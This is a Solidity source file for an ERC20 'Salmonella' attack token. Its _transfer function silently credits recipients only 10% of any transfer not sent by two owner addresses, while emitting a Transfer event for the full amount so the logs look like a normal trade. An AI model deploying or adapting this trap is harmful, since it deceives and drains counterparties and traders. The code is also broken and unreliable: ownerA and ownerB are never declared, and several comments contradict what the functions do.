pragma solidity ^0.8.0;

import "../interfaces/IERC20.sol";

/**
     * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
     * However, it incorporates specific rules to identify transactions involving anyone other than the designated owner. 
     * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
*/

contract SalmonellaAttackToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
   
   /**
     * @dev Sets the values for {name}, {symbol}, {decimals} and {totalSupply}.
     */
    constructor(uint256 initialSupply) {
        name = "SalmonellaAttackToken";
        symbol = "SAT";
        decimals = 18;
        totalSupply = initialSupply * 10**uint256(decimals);
        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
     /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance is the maximum `uint256`.
     *
     * Requirements:
     *  - `sender` and `recipient` cannot be the zero address.
     *  - `sender` must have a balance of at least `amount`.
     *  - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
     /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * Emits a {Transfer} event with Salmonella introduced: 
     * Added uint256 trapAmount = (amount * 10) / 100; in balance function which sends only 10% out of 100% of the price bought and 90% of the tokens will get burned.
     * Owner A: Adress 0
     * Owner B: Blockchain address
     * If sender = Owner A or B == normal Transfer
     * Otherwise, Execute Salmonella 
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        if (sender == ownerA || sender == ownerB) {
          _balances[sender] = senderBalance - amount;
          _balances[recipient] += amount;
        } else {
          _balances[sender] = senderBalance - amount;
          uint256 trapAmount = (amount * 10) / 100;
          _balances[recipient] += trapAmount;
        }
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to  e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
